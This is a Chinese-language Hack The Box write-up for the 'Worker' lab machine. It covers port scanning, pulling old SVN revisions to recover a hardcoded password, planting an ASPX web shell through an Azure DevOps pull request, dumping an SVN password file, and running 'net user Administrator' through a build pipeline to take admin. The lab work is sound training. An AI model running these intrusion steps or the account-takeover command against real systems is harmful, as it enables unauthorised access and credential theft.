---
layout: post
title:HTB——Worker
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-28 11:56:59] [INFO] 暴力破解线程数: 1
[2025-04-28 11:56:59] [INFO] 开始信息扫描
[2025-04-28 11:56:59] [INFO] 最终有效主机数量: 1
[2025-04-28 11:56:59] [INFO] 开始主机扫描
[2025-04-28 11:56:59] [INFO] 有效端口数量: 233
[2025-04-28 11:56:59] [SUCCESS] 端口开放 10.129.225.174:80
[2025-04-28 11:57:05] [SUCCESS] 服务识别 10.129.225.174:80 => [http]
[2025-04-28 11:57:11] [INFO] 存活端口数量: 1
[2025-04-28 11:57:11] [INFO] 开始漏洞扫描
[2025-04-28 11:57:11] [INFO] 加载的插件: webpoc, webtitle
[2025-04-28 11:57:12] [SUCCESS] 网站标题 http://10.129.225.174     状态码:200 长度:703    标题:IIS Windows Server
[2025-04-28 11:57:43] [SUCCESS] 扫描已完成: 2/2

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[12:00:07] [INFO] Start IpScan:10.129.225.174
[12:00:07] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[12:00:08] [+] 10.129.225.174:80 open
[12:00:08] [+] [TCP/HTTP] [200] [Microsoft-IIS/10.0][ASP] http://10.129.225.174:80 [IIS Windows Server]
[12:00:20] [+] 10.129.225.174:3690 open
[12:00:20] [+] [TCP/SVN]  [Subversion] 10.129.225.174:3690 [( success ( 2 2 ( ) ( edit-pipeline svndiff1 accep]
[12:00:20] [INFO] start SVN check 10.129.225.174:3690
[12:00:20] [+] 开始 SvnScan 任务: SVN://10.129.225.174:3690
[12:00:29] [+] 10.129.225.174:5985 open
[12:00:35] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.225.174:5985 [Not Found]
[12:00:35] [INFO] start WinRM check 10.129.225.174:5985
[12:00:35] [+] 开始 WinRMScan 任务: WinRM://10.129.225.174:5985
```

---

# 0x02 SVN库记录获取敏感信息

除了常规的80还扫到一个可疑的`3690`端口的服务，扫描结果显示为`Subversion`。我们使用kali内的svn尝试列举并下载远程服务器上的库。下载了`dimension.worker.htb`和`moved.txt`，我们可查看到源码与其对应的域名`http://devops.worker.htb`.将域名与对应IP绑定后我们再次访问即可成功访问到该服务。我们发现devops域名搭建的是Azure DevOps Server服务。

tips:有一个操作失误的地方，我们需要将整个SVN的url传上去来checkout下来，否则只checkout特定仓库我们是查看不到外部的修改信息的。在拉取整个repo后我们查看`svn log`

```bash
┌──(root㉿kali)-[/home/kali/HTB/Worker]
└─# svn log                                
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```

查看到第二个历史库时我们发现了ps1脚本

```bash
┌──(root㉿kali)-[/home/kali/HTB/Worker]
└─# svn list -r 2
deploy.ps1
dimension.worker.htb/
```

此时我们将r2的库从远程拉取到本地，即可获得此ps1脚本了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Worker]
└─# svn checkout -r 2 SVN://10.129.225.174:3690/ repo2
```

```powershell
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

---

# 0x03 Azure上传木马反弹shell

使用此账密可以登录`http://devops.worker.htb/`网站。上面有一个`SmartHotel360`项目，但是没说有啥用。再查看现有库，我们查看到一个名为`spectral`的库，猜测此即为子域名，我们添加进去。考虑到其`windows+IIS`的结构特性，我们尝试往库内塞入ASPX马来反弹shell。首先将我们的木马上传到新建的分支内

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/02.png?raw=true)

然后我们创建`pull requests`请求，将此main分支与master分支合并即可。注意如果不通过就阅读要求，在右下角随便把要求补齐即可。

这里碰到了新手法，对方将敏感文件放在了另一个磁盘内。我们需要先查看靶机的磁盘文件结构，再进入另一个盘查看。

```cmd
C:\Program Files\TortoiseSVN>type W:\svnrepos\www\conf\passwd
type W:\svnrepos\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

至此我们拿到了`robisl`的账密，使用evil-winrm登录

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/03.png?raw=true)

我们使用此账户再登陆一次azure，可发现此账户可掌控的库与之前的`nathen`有所不同。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/04.png?raw=true)

查看`project settings`，我们发现其用户属于`Build Administrators`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/05.png?raw=true)

我们在`pipelines`栏内创建新的pipelines，选择新建的类型为`starter pipelines`，在`scripts`内键入我们的执行指令，如`net user Administrator password!@#45`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/06.png?raw=true)

注意留那两句steps就可以了，剩下的全部删掉，否则build时可能会报错。最后咱们使用`evil-winrm`直接登录就可以辣。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Worker/07.png?raw=true)